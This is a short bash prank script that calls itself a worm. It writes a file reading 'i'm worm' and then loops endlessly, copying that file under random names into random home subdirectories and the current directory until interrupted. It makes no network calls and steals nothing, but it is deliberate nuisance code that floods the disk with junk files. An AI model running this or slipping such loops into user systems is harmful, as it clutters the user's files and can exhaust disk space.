#!/bin/bash
#This script replicates a bunch of files in your home directory.
#Press CRTL + C to stop i

echo "i'm worm" > worm

while [ true ]; do
	cp worm $(ls -p $HOME | grep / | sort -R | head -n1)$RANDOM ; cp worm $RANDOM
done
